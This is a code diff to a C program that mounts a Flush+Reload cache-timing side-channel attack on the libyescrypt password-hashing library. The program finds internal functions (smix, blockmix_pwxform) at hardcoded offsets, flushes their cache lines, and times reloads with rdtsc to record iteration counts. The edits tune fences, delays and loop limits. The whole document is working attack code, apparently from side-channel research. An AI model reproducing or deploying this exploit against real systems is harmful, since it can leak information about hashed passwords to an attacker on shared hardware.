@@ -17,6 +17,7 @@ uint32_t measure_one_block_access_time(uint64_t addr)
 	uint32_t cycles;
 
 	asm volatile("mov %1, %%r8\n\t"
+	"mfence\n\t"
 	"lfence\n\t"
 	"rdtsc\n\t"
 	"mov %%eax, %%edi\n\t"
@@ -31,14 +32,14 @@ uint32_t measure_one_block_access_time(uint64_t addr)
 	return cycles;
 }
 
-void wait_cycles(uint64_t cycles){
-    uint64_t start, end;
-    __asm__ volatile("lfence\n\t"
-    "rdtsc\n\t"
-    : "=a"(start));
+static inline void wait_cycles(uint64_t cycles){
+    uint32_t start, end;
+    __asm__ volatile(
+        "rdtsc\n\t"
+        : "=a"(start));
 
     do {
-        __asm__ volatile("lfence\n\t"
+        __asm__ volatile(
             "rdtsc\n\t"
             : "=a"(end));
     }while (end-start < cycles);
@@ -58,7 +59,7 @@ void get_eviction_set(void *buf, void **eviction_set, uint64_t set) {
 
 int main() {
     uint32_t t;
-    void *handle_libyescrypt = dlopen("../libyescrypt-ref.so", RTLD_LAZY);
+    void *handle_libyescrypt = dlopen("./libyescrypt-ref.so", RTLD_LAZY);
     void (*yescrypt_kdf)() = dlsym(handle_libyescrypt, "yescrypt_kdf");
     void (*blockmix_pwxform)() = yescrypt_kdf - 0x1610;
     void (*smix)() = yescrypt_kdf - 0xd80;
@@ -71,7 +72,7 @@ int main() {
     do {
         t = measure_one_block_access_time((uint64_t) smix);
         clflush((uint64_t) smix);
-        mfence();
+        //mfence();
         wait_cycles(500);
     } while (t > 100);
     
@@ -81,27 +82,28 @@ int main() {
         int iterations = 0;
         do {
             clflush((uint64_t) blockmix_pwxform + 0x23);
-            mfence();
-            wait_cycles(5000);
-            t = measure_one_block_access_time((uint64_t) blockmix_pwxform + 0x23);
+            //mfence();
+            wait_cycles(500);
+            t = measure_one_block_access_time((uint64_t) blockmix_pwxform+ 0x23);
             iterations++;
-        } while (iterations < 0 || t > 100 && iterations < 10000);
-        if (iterations == 10000) {
-            printf("\nlast t: %d\n", t);
-            printf("itarations: %d\n", iterations);
+        } while (iterations <= 0 || t > 100 && iterations < 1000000);
+        if (iterations == 1000000) {
+            printf("\nlast t: %d\n\n", t);
+            //printf("itarations: %d\n", iterations);
             break;
             
         }
-        tmp[ticker] = iterations;
-        ticker++;
+        if (iterations >= 0) {
+            tmp[ticker] = iterations;
+            ticker++;
+        }
         
         //this needes to be tuned (is yescrypt slowed down?) 
-        //wait_cycles(20000);
-        //printf("cycles: %d\n", end-start);
+        wait_cycles(1000);
     } while (1);
 
-    printf("\nticker: %d\n", ticker);
     for (int i=0; i<ticker; i++) printf("iterations: %d\n", tmp[i]);
+    printf("\nticker: %d\n", ticker);
     
     return 0;
 }
